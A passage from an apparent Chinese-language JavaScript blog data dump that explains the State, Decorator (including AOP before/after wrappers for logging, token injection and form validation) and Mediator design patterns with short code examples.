StateFactory(&#123; clickHandler1: function() &#123; this.uploadObj.pause(); &#125;, clickHandler2: function() &#123; console.log('文 件 正 在 上 传 中， 不 能 删 除'); &#125;&#125;);var PauseState = StateFactory(&#123; clickHandler1: function() &#123; this.uploadObj.uploading(); &#125;, clickHandler2: function() &#123; this.uploadObj.del(); &#125;&#125;);var DoneState = StateFactory(&#123; clickHandler1: function() &#123; console.log('文 件 已 完 成 上 传, 点 击 无 效'); &#125;, clickHandler2: function() &#123; this.uploadObj.del(); &#125;&#125;);var ErrorState = StateFactory(&#123; clickHandler1: function() &#123; console.log('文 件 上 传 失 败, 点 击 无 效'); &#125;, clickHandler2: function() &#123; this.uploadObj.del(); &#125;&#125;); 状态模式的优缺点通过两个状态模式的例子，总结状态模式的优缺点。状态模式的优点如下 状态模式定义了状态与行为之间的关系，并将它们封装在一个类里。通过增加新的状态类，很容易增加新的状态和转换。 避免Context无限膨胀，状态切换的逻辑被分布在状态类中，也去掉了Context中原本过多的条件分支。 用对象代替字符串来记录当前状态，使得状态的切换更加一目了然。 Context中的请求动作和状态类中封装的行为可以非常容易地独立变化而互不影响。 状态模式的缺点是会在系统中定义许多状态类，编写20个状态类是一项枯燥乏味的工作，而且系统中会因此而增加不少对象。另外，由于逻辑分散在状态类中，虽然避开了不受欢迎的条件分支语句，但也造成了逻辑分散的问题，我们无法在一个地方就看出整个状态机的逻辑。 状态模式中的性能优化点在这两个例子中，我们并没有太多地从性能方面考虑问题，实际上，这里有一些比较大的优化点。 有两种选择来管理state对象的创建和销毁。第一种是仅当state对象被需要时才创建并随后销毁，另一种是一开始就创建好所有的状态对象，并且始终不销毁它们。如果state对象比较庞大，可以用第一种方式来节省内存，这样可以避免创建一些不会用到的对象并及时地回收它们。但如果状态的改变很频繁，最好一开始就把这些state对象都创建出来，也没有必要销毁它们，因为可能很快将再次用到它们。 在例子中为每个Context对象都创建了一组state对象，实际上这些state对象之间是可以共享的，各Context对象可以共享一个state对象，这也是享元模式的应用场景之一。 状态模式和策略模式的关系状态模式和策略模式像一对双胞胎，它们都封装了一系列的算法或者行为，它们的类图看起来几乎一模一样，但在意图上有很大不同，因此它们是两种迥然不同的模式。 策略模式和状态模式的相同点是，它们都有一个上下文、一些策略或者状态类，上下文把请求委托给这些类来执行。 它们之间的区别是策略模式中的各个策略类之间是平等又平行的，它们之间没有任何联系，所以客户必须熟知这些策略类的作用，以便客户可以随时主动切换算法；而在状态模式中，状态和状态对应的行为是早已被封装好的，状态之间的切换也早被规定完成，“改变行为”这件事情发生在状态模式内部。对客户来说，并不需要了解这些细节。这正是状态模式的作用所在。 JavaScript版本的状态机前面两个示例都是模拟传统面向对象语言的状态模式实现，我们为每种状态都定义一个状态子类，然后在Context中持有这些状态对象的引用，以便把currState设置为当前的状态对象。 状态模式是状态机的实现之一，但在JavaScript这种“无类”语言中，没有规定让状态对象一定要从类中创建而来。另外一点，JavaScript可以非常方便地使用委托技术，并不需要事先让一个对象持有另一个对象。下面的状态机选择了通过Function.prototype.call方法直接把请求委托给某个字面量对象来执行。 改写电灯的例子：123456789101112131415161718192021222324252627282930313233var FSM = &#123; off: &#123; buttonWasPressed: function() &#123; console.log('关 灯'); this.button.innerHTML = '下 一 次 按 我 是 开 灯'; this.currState = FSM.on; &#125; &#125;, on: &#123; buttonWasPressed: function() &#123; console.log('开 灯'); this.button.innerHTML = '下 一 次 按 我 是 关 灯'; this.currState = FSM.off; &#125; &#125;&#125;;var Light = function() &#123; this.currState = FSM.off; // 设 置 当 前 状 态 this.button = null;&#125;;Light.prototype.init = function() &#123; var button = document.createElement('button'), self = this; button.innerHTML = '已 关 灯'; this.button = document.body.appendChild(button); this.button.onclick = function() &#123; self.currState.buttonWasPressed.call(self); // 把 请 求 委 托 给 FSM 状 态 机 &#125;&#125;;var light = new Light();light.init(); 接下来尝试另外一种方法，利用下面的delegate函数完成状态机。这是面向对象设计和闭包互换的一个例子，前者把变量保存为对象的属性，而后者把变量封闭在闭包形成的环境中：1234567891011121314151617181920212223var delegate = function(client, delegation) &#123; return &#123; buttonWasPressed: function() &#123; // 将 客 户 的 操 作 委 托 给 delegation 对 象 return delegation.buttonWasPressed.apply(client, arguments); &#125; &#125;&#125;;var Light = function() &#123; this.offState = delegate(this, FSM.off); this.onState = delegate(this, FSM.on); this.currState = this.offState; // 设 置 初 始 状 态 为 关 闭 状 态 this.button = null; &#125;;Light.prototype.init = function() &#123; var button = document.createElement('button'), self = this; button.innerHTML = '已 关 灯'; this.button = document.body.appendChild(button); this.button.onclick = function() &#123; self.currState.buttonWasPressed(); &#125;&#125;; 表驱动的有限状态机其实还有另外一种实现状态机的方法，这种方法的核心是基于表驱动的。我们可以在表中很清楚地看到下一个状态是由当前状态和行为共同决定的。这样一来，我们就可以在表中查找状态，而不必定义很多条件分支，刚好GitHub上有一个对应的库实现，通过这个库，可以很方便地创建出FSM：1234567891011121314151617181920212223var fsm = StateMachine.create(&#123; initial: 'off', events: [&#123; name: 'buttonWasPressed', from: 'off', to: 'on' &#125;, &#123; name: 'buttonWasPressed', from: 'on', to: 'off' &#125;], callbacks: &#123; onbuttonWasPressed: function(event, from, to) &#123; console.log(arguments); &#125; &#125;, error: function(eventName, from, to, args, errorCode, errorMessage) &#123; console.log(arguments); // 从 一 种 状 态 试 图 切 换 到 一 种 不 可 能 到 达 的 状 态 的 时 候 &#125;&#125;);button.onclick = function() &#123; fsm.buttonWasPressed();&#125; 关于这个库：javascript-state-machine 实际项目中的其他状态机在实际开发中，很多场景都可以用状态机来模拟，比如一个下拉菜单在hover动作下有显示、悬浮、隐藏等状态；一次TCP请求有建立连接、监听、关闭等状态；一个格斗游戏中人物有攻击、防御、跳跃、跌倒等状态。 状态机在游戏开发中也有着广泛的用途，特别是游戏AI的逻辑编写。在作者曾经开发的HTML5版街头霸王游戏里，游戏主角Ryu有走动、攻击、防御、跌倒、跳跃等多种状态。这些状态之间既互相联系又互相约束。比如Ryu在走动的过程中如果被攻击，就会由走动状态切换为跌倒状态。在跌倒状态下，Ryu既不能攻击也不能防御。同样，Ryu也不能在跳跃的过程中切换到防御状态，但是可以进行攻击。这种场景就很适合用状态机来描述。代码如下：123456789101112131415161718192021222324var FSM = &#123; walk: &#123; attack: function() &#123; console.log('攻 击'); &#125;, defense: function() &#123; console.log('防 御'); &#125;, jump: function() &#123; console.log('跳 跃'); &#125; &#125;, attack: &#123; walk: function() &#123; console.log('攻 击 的 时 候 不 能 行 走'); &#125;, defense: function() &#123; console.log('攻 击 的 时 候 不 能 防 御'); &#125;, jump: function() &#123; console.log('攻 击 的 时 候 不 能 跳 跃'); &#125; &#125;&#125; 小结通过几个例子，讲解了状态模式在实际开发中的应用。状态模式也许是被大家低估的模式之一。实际上，通过状态模式重构代码之后，很多杂乱无章的代码会变得清晰。虽然状态模式一开始并不是非常容易理解，但我们有必须去好好掌握这种设计模式。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"design pattern","slug":"design-pattern","permalink":"https://github.com/xmoyKING/tags/design-pattern/"}]},{"title":"JS设计模式-14-装饰器模式","slug":"js-pattern14","date":"2017-12-02T00:39:08.000Z","updated":"2017-12-06T14:50:09.321Z","comments":true,"path":"2017/12/02/js-pattern14/","link":"","permalink":"https://github.com/xmoyKING/2017/12/02/js-pattern14/","excerpt":"","text":"在程序开发中，许多时候都并不希望某个类天生就非常庞大，一次性包含许多职责。那么我们就可以使用装饰者模式。装饰者模式可以动态地给某个对象添加一些额外的职责，而不会影响从这个类中派生的其他对象。 在传统的面向对象语言中，给对象添加功能常常使用继承的方式，但是继承的方式并不灵活，还会带来许多问题：一方面会导致超类和子类之间存在强耦合性，当超类改变时，子类也会随之改变；另一方面，继承这种功能复用方式通常被称为“白箱复用”，“白箱”是相对可见性而言的，在继承方式中，超类的内部细节是对子类可见的，继承常常被认为破坏了封装性。 使用继承还会带来另外一个问题，在完成一些功能复用的同时，有可能创建出大量的子类，使子类的数量呈爆炸性增长。比如现在有4种型号的自行车，我们为每种自行车都定义了一个单独的类。现在要给每种自行车都装上前灯、尾灯和铃铛这3种配件。如果使用继承的方式来给每种自行车创建子类，则需要4×3=12个子类。但是如果把前灯、尾灯、铃铛这些对象动态组合到自行车上面，则只需要额外增加3个类。 这种给对象动态地增加职责的方式称为装饰者（decorator）模式。装饰者模式能够在不改变对象自身的基础上，在程序运行期间给对象动态地添加职责。跟继承相比，装饰者是一种更轻便灵活的做法，这是一种“即用即付”的方式，比如天冷了就多穿一件外套，需要飞行时就在头上插一支竹蜻蜓，遇到一堆食尸鬼时就点开AOE（范围攻击）技能。 模拟传统面向对象语言的装饰者模式首先要提出来的是，作为一门解释执行的语言，给JavaScript中的对象动态添加或者改变职责是一件再简单不过的事情，虽然这种做法改动了对象自身，跟传统定义中的装饰者模式并不一样，但这无疑更符合JavaScript的语言特色。代码如下：12var obj = &#123; name: 'sven', address: '深 圳 市' &#125;; obj.address = obj.address + '福 田 区'; 传统面向对象语言中的装饰者模式在JavaScript中适用的场景并不多，如上面代码所示，通常我们并不太介意改动对象自身。尽管如此，还是稍微模拟一下传统面向对象语言中的装饰者模式实现。 假设我们在编写一个飞机大战的游戏，随着经验值的增加，我们操作的飞机对象可以升级成更厉害的飞机，一开始这些飞机只能发射普通的子弹，升到第二级时可以发射导弹，升到第三级时可以发射原子弹。 下面来看代码实现，首先是原始的飞机类：12var Plane = function()&#123;&#125; Plane.prototype.fire = function()&#123; console.log( '发 射 普 通 子 弹' ); &#125; 接下来增加两个装饰类，分别是导弹和原子弹：1234567891011var MissileDecorator = function( plane )&#123; this.plane = plane; &#125;MissileDecorator.prototype.fire = function()&#123; this.plane.fire(); console.log( '发 射 导 弹' ); &#125; var AtomDecorator = function( plane )&#123; this.plane = plane; &#125;AtomDecorator.prototype.fire = function()&#123; this.plane.fire(); console.log( '发 射 原 子 弹' ); &#125; 导弹类和原子弹类的构造函数都接受参数plane对象，并且保存好这个参数，在它们的fire方法中，除了执行自身的操作之外，还调用plane对象的fire方法。 这种给对象动态增加职责的方式，并没有真正地改动对象自身，而是将对象放入另一个对象之中，这些对象以一条链的方式进行引用，形成一个聚合对象。这些对象都拥有相同的接口（fire方法），当请求达到链中的某个对象时，这个对象会执行自身的操作，随后把请求转发给链中的下一个对象。 因为装饰者对象和它所装饰的对象拥有一致的接口，所以它们对使用该对象的客户来说是透明的，被装饰的对象也并不需要了解它曾经被装饰过，这种透明性使得我们可以递归地嵌套任意多个装饰者对象. 测试：12345var plane = new Plane(); plane = new MissileDecorator( plane ); plane = new AtomDecorator( plane ); plane.fire(); // 分 别 输 出： 发 射 普 通 子 弹、 发 射 导 弹、 发 射 原 子 弹 装饰者也是包装器在《设计模式》成书之前，GoF原想把装饰者（decorator）模式称为包装器（wrapper）模式。从功能上而言，decorator能很好地描述这个模式，但从结构上看，wrapper的说法更加贴切。装饰者模式将一个对象嵌入另一个对象之中，实际上相当于这个对象被另一个对象包装起来，形成一条包装链。请求随着这条链依次传递到所有的对象，每个对象都有处理这条请求的机会。 回到JavaScript的装饰者JavaScript语言动态改变对象相当容易，我们可以直接改写对象或者对象的某个方法，并不需要使用“类”来实现装饰者模式，代码如下：1234567891011var plane = &#123; fire: function()&#123; console.log( '发 射 普 通 子 弹' ); &#125; &#125; var missileDecorator = function()&#123; console.log( '发 射 导 弹' ); &#125; var atomDecorator = function()&#123; console.log( '发 射 原 子 弹' ); &#125; var fire1 = plane.fire; plane.fire = function()&#123; fire1(); missileDecorator(); &#125; var fire2 = plane.fire; plane.fire = function()&#123; fire2(); atomDecorator(); &#125; plane.fire(); // 分 别 输 出： 发 射 普 通 子 弹、 发 射 导 弹、 发 射 原 子 弹 装饰函数在JavaScript中，几乎一切都是对象，其中函数又被称为一等对象。在平时的开发工作中，也许大部分时间都在和函数打交道。在JavaScript中可以很方便地给某个对象扩展属性和方法，但却很难在不改动某个函数源代码的情况下，给该函数添加一些额外的功能。在代码的运行期间，我们很难切入某个函数的执行环境。 要想为函数添加一些功能，最简单粗暴的方式就是直接改写该函数，但这是最差的办法，直接违反了开放-封闭原则：123var a = function()&#123; alert (1); &#125; // 改 成： var a = function()&#123; alert (1); alert (2); &#125; 很多时候我们不想去碰原函数，也许原函数是由其他同事编写的，里面的实现非常杂乱。现在需要一个办法，在不改变函数源代码的情况下，能给函数增加功能，这正是开放-封闭原则。 其实通过保存原引用的方式就可以改写某个函数：123var _a = a; a = function()&#123; _a(); alert (2); &#125; a(); 这是实际开发中很常见的一种做法，比如我们想给window绑定onload事件，但是又不确定这个事件是不是已经被其他人绑定过，为了避免覆盖掉之前的window.onload函数中的行为，我们一般都会先保存好原先的window.onload，把它放入新的window.onload里执行.1234window.onload = function()&#123; alert (1); &#125; var _onload = window.onload || function()&#123;&#125;;window.onload = function()&#123; _onload(); alert (2); &#125; 这样的代码当然是符合开放-封闭原则的，我们在增加新功能的时候，确实没有修改原来的window.onload代码，但是这种方式存在以下两个问题。 必须维护_onload这个中间变量，虽然看起来并不起眼，但如果函数的装饰链较长，或者需要装饰的函数变多，这些中间变量的数量也会越来越多。 其实还遇到了this被劫持的问题，在window.onload的例子中没有这个烦恼，是因为调用普通函数_onload时，this也指向window，跟调用window.onload时一样（函数作为对象的方法被调用时，this指向该对象，所以此处this也只指向window）。现在把window.onload换成document.getElementById，代码如下:123456var _getElementById = document.getElementById; document.getElementById = function( id )&#123; alert (1); return _getElementById( id ); // (1) &#125; var button = document.getElementById( 'button' ); 执行这段代码，我们看到在弹出alert(1)之后，紧接着控制台抛出了异常.1Uncaught TypeError: Illegal invocation 异常发生在(1)处的_getElementById(id)这句代码上，此时_getElementById是一个全局函数，当调用一个全局函数时，this是指向window的，而document.getElementById方法的内部实现需要使用this引用，this在这个方法内预期是指向document，而不是window,这是错误发生的原因，所以使用现在的方式给函数增加功能并不保险。 改进后的代码可以满足需求，我们要手动把document当作上下文this传入_getElementById：1234document.getElementById = function()&#123; alert (1); return _getElementById.apply( document, arguments ); &#125; 但这样做显然很不方便，引入AOP来提供一种完美的方法给函数动态增加功能。 用AOP装饰函数首先给出Function.prototype.before方法和Function.prototype.after方法：1234567891011121314151617Function.prototype.before = function(beforefn) &#123; var __self = this; // 保 存 原 函 数 的 引 用 return function() &#123; // 返 回 包 含 了 原 函 数 和 新 函 数 的\" 代 理\" 函 数 beforefn.apply(this, arguments); // 执 行 新 函 数， 且 保 证 this 不 被 劫 持， 新 函 数 接 受 的 参 数 // 也 会 被 原 封 不 动 地 传 入 原 函 数， 新 函 数 在 原 函 数 之 前 执 行 return __self.apply(this, arguments); // 执 行 原 函 数 并 返 回 原 函 数 的 执 行 结 果， // 并 且 保 证 this 不 被 劫 持 &#125;&#125;Function.prototype.after = function(afterfn) &#123; var __self = this; return function() &#123; var ret = __self.apply(this, arguments); afterfn.apply(this, arguments); return ret; &#125;&#125;; Function.prototype.before接受一个函数当作参数，这个函数即为新添加的函数，它装载了新添加的功能代码。 接下来把当前的this保存起来，这个this指向原函数，然后返回一个“代理”函数，这个“代理”函数只是结构上像代理而已，并不承担代理的职责（比如控制对象的访问等）。它的工作是把请求分别转发给新添加的函数和原函数，且负责保证它们的执行顺序，让新添加的函数在原函数之前执行（前置装饰），这样就实现了动态装饰的效果。 我们注意到，通过Function.prototype.apply来动态传入正确的this，保证了函数在被装饰之后，this不会被劫持。 Function.prototype.after的原理跟Function.prototype.before一模一样，唯一不同的地方在于让新添加的函数在原函数执行之后再执行。下面来试试用Function.prototype.before的威力：123456789101112Function.prototype.before = function(beforefn) &#123; var __self = this; return function() &#123; beforefn.apply(this, arguments); return __self.apply(this, arguments); &#125;&#125;document.getElementById = document.getElementById.before(function() &#123; alert(1);&#125;);var button = document.getElementById('button');console.log(button); 回到window.onload的例子，看看用Function.prototype.after来增加新的window.onload事件是多么简单：12345678910window.onload = function() &#123; alert(1);&#125;window.onload = (window.onload || function() &#123;&#125;).after(function() &#123; alert(2);&#125;).after(function() &#123; alert(3);&#125;).after(function() &#123; alert(4);&#125;); 值得提到的是，上面的AOP实现是在Function.prototype上添加before和after方法，但许多人不喜欢这种污染原型的方式，那么我们可以做一些变通，把原函数和新函数都作为参数传入before或者after方法：123456789101112131415var before = function(fn, beforefn) &#123; return function() &#123; beforefn.apply(this, arguments); return fn.apply(this, arguments); &#125; &#125;var a = before(function() &#123; alert(3)&#125;, function() &#123; alert(2)&#125;);a = before(a, function() &#123; alert(1);&#125;);a(); AOP的应用实例用AOP装饰函数的技巧在实际开发中非常有用。不论是业务代码的编写，还是在框架层面，我们都可以把行为依照职责分成粒度更细的函数，随后通过装饰把它们合并到一起，这有助于我们编写一个松耦合和高复用性的系统。 数据统计上报分离业务代码和数据统计代码，无论在什么语言中，都是AOP的经典应用之一。在项目开发的结尾阶段难免要加上很多统计数据的代码，这些过程可能让我们被迫改动早已封装好的函数。 比如页面中有一个登录button，点击这个button会弹出登录浮层，与此同时要进行数据上报，来统计有多少用户点击了这个登录button：12345678910var showLogin = function() &#123; console.log('打 开 登 录 浮 层'); log(this.getAttribute('tag')); &#125;var log = function(tag) &#123; console.log('上 报 标 签 为: ' + tag); //(newImage).src='http://xxx.com/report?tag='+tag; //真正的上报代码略 &#125;document.getElementById('button').onclick = showLogin; 在showLogin函数里，既要负责打开登录浮层，又要负责数据上报，这是两个层面的功能，在此处却被耦合在一个函数里。使用AOP分离之后，代码如下：12345678910111213141516Function.prototype.after = function(afterfn) &#123; var __self = this; return function() &#123; var ret = __self.apply(this, arguments); afterfn.apply(this, arguments); return ret; &#125;&#125;;var showLogin = function() &#123; console.log('打 开 登 录 浮 层'); &#125;var log = function() &#123; console.log('上 报 标 签 为: ' + this.getAttribute('tag')); &#125;showLogin = showLogin.after(log); // 打 开 登 录 浮 层 之 后 上 报 数 据 document.getElementById('button').onclick = showLogin; 用AOP动态改变函数的参数观察Function.prototype.before方法：1234567Function.prototype.before = function(beforefn) &#123; var __self = this; return function() &#123; beforefn.apply(this, arguments); // (1) return __self.apply(this, arguments); // (2) &#125;&#125; 从这段代码的(1)处和(2)处可以看到，beforefn和原函数__self共用一组参数列表arguments，当我们在beforefn的函数体内改变arguments的时候，原函数__self接收的参数列表自然也会变化。下面的例子展示了如何通过Function.prototype.before方法给函数func的参数param动态地添加属性b：123456var func = function( param )&#123; console.log( param ); // 输 出： &#123;a: \"a\", b: \"b\"&#125; &#125; func = func.before( function( param )&#123; param.b = 'b'; &#125;); func( &#123;a: 'a'&#125; ); 现在有一个用于发起ajax请求的函数，这个函数负责项目中所有的ajax异步请求：12345var ajax = function( type, url, param )&#123; console.dir( param); // 发 送 ajax 请 求 的 代 码 略 &#125;; ajax( 'get', 'http://xxx.com/userinfo', &#123; name: 'sven' &#125; ); 上面的伪代码表示向后台cgi发起一个请求来获取用户信息，传递给cgi的参数是{name:’sven’}。ajax函数在项目中一直运转良好，跟cgi的合作也很愉快。直到有一天，网站遭受了CSRF攻击。解决CSRF攻击最简单的一个办法就是在HTTP请求中带上一个Token参数。 假设我们已经有一个用于生成Token的函数：1var getToken = function()&#123; return 'Token'; &#125; 现在的任务是给每个ajax请求都加上Token参数：1234var ajax = function( type, url, param )&#123; param = param || &#123;&#125;; Param.Token = getToken(); // 发 送 ajax 请 求 的 代 码 略... &#125;; 虽然已经解决了问题，但我们的ajax函数相对变得僵硬了，每个从ajax函数里发出的请求都自动带上了Token参数，虽然在现在的项目中没有什么问题，但如果将来把这个函数移植到其他项目上，或者把它放到一个开源库中供其他人使用，Token参数都将是多余的。 也许另一个项目不需要验证Token，或者是Token的生成方式不同，无论是哪种情况，都必须重新修改ajax函数。 为了解决这个问题，先把ajax函数还原成一个干净的函数,然后把Token参数通过Function.prototyte.before装饰到ajax函数的参数param对象中：1234567891011121314var ajax = function( type, url, param )&#123; console.dir( param); // 发 送 ajax 请 求 的 代 码 略 &#125;; var getToken = function() &#123; return 'Token'; &#125;ajax = ajax.before(function(type, url, param) &#123; param.Token = getToken();&#125;);ajax('get', 'http://xxx.com/userinfo', &#123; name: 'sven'&#125;); 明显可以看到，用AOP的方式给ajax函数动态装饰上Token参数，保证了ajax函数是一个相对纯净的函数，提高了ajax函数的可复用性，它在被迁往其他项目的时候，不需要做任何修改。 插件式的表单验证我们很多人都写过许多表单验证的代码，在一个Web项目中，可能存在非常多的表单，如注册、登录、修改用户信息等。在表单数据提交给后台之前，常常要做一些校验，比如登录的时候需要验证用户名和密码是否为空，代码如下：12345678910111213141516171819var username = document.getElementById('username'), password = document.getElementById('password'), submitBtn = document.getElementById('submitBtn');var formSubmit = function() &#123; if (username.value === '') &#123; return alert('用 户 名 不 能 为 空'); &#125; if (password.value === '') &#123; return alert('密 码 不 能 为 空'); &#125; var param = &#123; username: username.value, password: password.value &#125; ajax('http:// xxx.com/ login', param); // ajax 具 体 实 现 略 &#125;submitBtn.onclick = function() &#123; formSubmit();&#125; formSubmit函数在此处承担了两个职责，除了提交ajax请求之外，还要验证用户输入的合法性。这种代码一来会造成函数臃肿，职责混乱，二来谈不上任何可复用性。 目的是分离校验输入和提交ajax请求的代码，我们把校验输入的逻辑放到validata函数中，并且约定当validata函数返回false的时候，表示校验未通过，代码如下：1234567891011121314151617181920212223var validata = function() &#123; if (username.value === '') &#123; alert('用 户 名 不 能 为 空'); return false; &#125; if (password.value === '') &#123; alert('密 码 不 能 为 空'); return false; &#125; &#125;var formSubmit = function() &#123; if (validata() === false) &#123; // 校 验 未 通 过 return; &#125; var param = &#123; username: username.value, password: password.value &#125; ajax('http:// xxx.com/ login', param); &#125;submitBtn.onclick = function() &#123; formSubmit();&#125; 现在的代码已经有了一些改进，我们把校验的逻辑都放到了validata函数中，但formSubmit函数的内部还要计算validata函数的返回值，因为返回值的结果表明了是否通过校验。 接下来进一步优化这段代码，使validata和formSubmit完全分离开来。首先要改写Function.prototype.before，如果beforefn的执行结果返回false，表示不再执行后面的原函数，代码如下：123456789101112131415161718192021222324252627282930Function.prototype.before = function(beforefn) &#123; var __self = this; return function() &#123; if (beforefn.apply(this, arguments) === false) &#123; // beforefn 返 回 false 的 情 况 直 接 return， 不 再 执 行 后 面 的 原 函 数 return; &#125; return __self.apply(this, arguments); &#125;&#125;var validata = function() &#123; if (username.value === '') &#123; alert('用 户 名 不 能 为 空'); return false; &#125; if (password.value === '') &#123; alert('密 码 不 能 为 空'); return false; &#125; &#125;var formSubmit = function() &#123; var param = &#123; username: username.value, password: password.value &#125; ajax('http:// xxx.com/ login', param); &#125;formSubmit = formSubmit.before(validata);submitBtn.onclick = function() &#123; formSubmit();&#125; 在这段代码中，校验输入和提交表单的代码完全分离开来，它们不再有任何耦合关系，formSubmit=formSubmit.before(validata)这句代码，如同把校验规则动态接在formSubmit函数之前，validata成为一个即插即用的函数，它甚至可以被写成配置文件的形式，这有利于我们分开维护这两个函数。再利用策略模式稍加改造，我们就可以把这些校验规则都写成插件的形式，用在不同的项目当中。 注意，因为函数通过Function.prototype.before或者Function.prototype.after被装饰之后，返回的实际上是一个新的函数，如果在原函数上保存了一些属性，那么这些属性会丢失。代码如下：1234var func = function()&#123; alert( 1 ); &#125; func.a = 'a'; func = func.after( function()&#123; alert( 2 ); &#125;); alert ( func.a ); // 输 出： undefined 另外，这种装饰方式也叠加了函数的作用域，如果装饰的链条过长，性能上也会受到一些影响。 装饰者模式和代理模式装饰者模式和代理模式的结构看起来非常相像，这两种模式都描述了怎样为对象提供一定程度上的间接引用，它们的实现部分都保留了对另外一个对象的引用，并且向那个对象发送请求。代理模式和装饰者模式最重要的区别在于它们的意图和设计目的。 代理模式的目的是，当直接访问本体不方便或者不符合需要时，为这个本体提供一个替代者。本体定义了关键功能，而代理提供或拒绝对它的访问，或者在访问本体之前做一些额外的事情。装饰者模式的作用就是为对象动态加入行为。换句话说，代理模式强调一种关系（Proxy与它的实体之间的关系），这种关系可以静态的表达，也就是说，这种关系在一开始就可以被确定。而装饰者模式用于一开始不能确定对象的全部功能时。代理模式通常只有一层代理-本体的引用，而装饰者模式经常会形成一条长长的装饰链。 在虚拟代理实现图片预加载的例子中，本体负责设置img节点的src，代理则提供了预加载的功能，这看起来也是“加入行为”的一种方式，但这种加入行为的方式和装饰者模式的偏重点是不一样的。装饰者模式是实实在在的为对象增加新的职责和行为，而代理做的事情还是跟本体一样，最终都是设置src。但代理可以加入一些“聪明”的功能，比如在图片真正加载好之前，先使用一张占位的loading图片反馈给客户。 小结通过数据上报、统计函数的执行时间、动态改变函数参数以及插件式的表单验证这4个例子，了解了装饰函数，它是JavaScript中独特的装饰者模式。这种模式在实际开发中非常有用，除了上面提到的例子，它在框架开发中也十分有用。作为框架作者，希望框架里的函数提供的是一些稳定而方便移植的功能，那些个性化的功能可以在框架之外动态装饰上去，这可以避免为了让框架拥有更多的功能，而去使用一些if、else语句预测用户的实际需要。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"design pattern","slug":"design-pattern","permalink":"https://github.com/xmoyKING/tags/design-pattern/"}]},{"title":"JS设计模式-13-中介者模式","slug":"js-pattern13","date":"2017-11-30T08:50:39.000Z","updated":"2017-12-06T14:50:09.305Z","comments":true,"path":"2017/11/30/js-pattern13/","link":"","permalink":"https://github.com/xmoyKING/2017/11/30/js-pattern13/","excerpt":"","text":"在我们生活的世界中，每个人每个物体之间都会产生一些错综复杂的联系。在应用程序里也是一样，程序由大大小小的单一对象组成，所有这些对象都按照某种关系和规则来通信。 平时我们大概能记住10个朋友的电话、30家餐馆的位置。在程序里，也许一个对象会和其他10个对象打交道，所以它会保持10个对象的引用。当程序的规模增大，对象会越来越多，它们之间的关系也越来越复杂，难免会形成网状的交叉引用。当我们改变或删除其中一个对象的时候，很可能需要通知所有引用到它的对象。这样一来，就像在心脏旁边拆掉一根毛细血管一般，即使一点很小的修改也必须小心翼翼， 面向对象设计鼓励将行为分布到各个对象中，把对象划分成更小的粒度，有助于增强对象的可复用性，但由于这些细粒度对象之间的联系激增，又有可能会反过来降低它们的可复用性。 中介者模式的作用就是解除对象与对象之间的紧耦合关系。增加一个中介者对象后，所有的相关对象都通过中介者对象来通信，而不是互相引用，所以当一个对象发生改变时，只需要通知中介者对象即可。中介者使各对象之间耦合松散，而且可以独立地改变它们之间的交互。中介者模式使网状的多对多关系变成了相对简单的一对多关系。图中，如果对象A发生了改变，则需要同时通知跟A发生引用关系的B、D、E、F这4个对象；而使用中介者模式改进之后，A发生改变时则只需要通知这个中介者对象即可。 现实中的中介者在现实生活中也有很多中介者的例子，例如 机场指挥塔中介者也被称为调停者，我们想象一下机场的指挥塔，如果没有指挥塔的存在，每一架飞机要和方圆100公里内的所有飞机通信，才能确定航线以及飞行状况，后果是不可想象的。现实中的情况是，每架飞机都只需要和指挥塔通信。指挥塔作为调停者，知道每一架飞机的飞行状况，所以它可以安排所有飞机的起降时间，及时做出航线调整。 博彩公司打麻将的人经常遇到这样的问题，打了几局之后开始计算钱，A自摸了两把，B杠了三次，C点炮一次给D，谁应该给谁多少钱已经很难计算清楚，而这还是在只有4个人参与的情况下。在世界杯期间购买足球彩票，如果没有博彩公司作为中介，上千万的人一起计算赔率和输赢绝对是不可能实现的事情。有了博彩公司作为中介，每个人只需和博彩公司发生关联，博彩公司会根据所有人的投注情况计算好赔率，彩民们赢了钱就从博彩公司拿，输了钱就交给博彩公司。 中介者模式的例子——泡泡堂游戏大家可能都还记得泡泡堂游戏，作者曾经写过一个JS版的泡泡堂，现在我们来一起回顾这个游戏，在游戏之初只支持两个玩家同时进行对战。 先定义一个玩家构造函数，它有3个简单的原型方法：Play.prototype.win、Play.prototype.lose以及表示玩家死亡的Play.prototype.die。 因为玩家的数目是2，所以当其中一个玩家死亡的时候游戏便结束,同时通知它的对手胜利。这段代码看起来很简单：1234567891011121314function Player(name) &#123; this.name = name; this.enemy = null; // 敌 人 &#125;;Player.prototype.win = function() &#123; console.log(this.name + ' won ');&#125;;Player.prototype.lose = function() &#123; console.log(this.name + ' lost');&#125;;Player.prototype.die = function() &#123; this.lose(); this.enemy.win();&#125;; 接下来创建2个玩家对象：12var player1 = new Player( '皮 蛋' ); var player2 = new Player( '小 乖' ); 给玩家相互设置敌人：12player1.enemy = player2; player2.enemy = player1; 当玩家player1被泡泡炸死的时候，只需要调用这一句代码便完成了一局游戏：1player1.die();//输出：皮蛋lost、小乖won 只有2个玩家其实没什么意思，真正的泡泡堂游戏至多可以有8个玩家，并分成红蓝两队进行游戏。 为游戏增加队伍改进一下游戏。因为玩家数量变多，用下面的方式来设置队友和敌人无疑很低效：1234player1.partners = [player1, player2, player3, player4];player1.enemies = [player5, player6, player7, player8];Player5.partners = [player5, player6, player7, player8];Player5.enemies = [player1, player2, player3, player4]; 所以我们定义一个数组players来保存所有的玩家，在创建玩家之后，循环players来给每个玩家设置队友和敌人,再改写构造函数Player，使每个玩家对象都增加一些属性，分别是队友列表、敌人列表、玩家当前状态、角色名字以及玩家所在的队伍颜色：123456789var players = [];function Player(name, teamColor) &#123; this.partners = []; // 队 友 列 表 this.enemies = []; // 敌 人 列 表 this.state = 'live'; // 玩 家 状 态 this.name = name; // 角 色 名 字 this.teamColor = teamColor; // 队 伍 颜 色 &#125;; 玩家胜利和失败之后的展现依然很简单，只是在每个玩家的屏幕上简单地弹出提示：12Player.prototype.win = function()&#123; console.log( 'winner: ' + this.name ); &#125;;Player.prototype.lose = function()&#123; console.log( 'loser: ' + this.name ); &#125;; 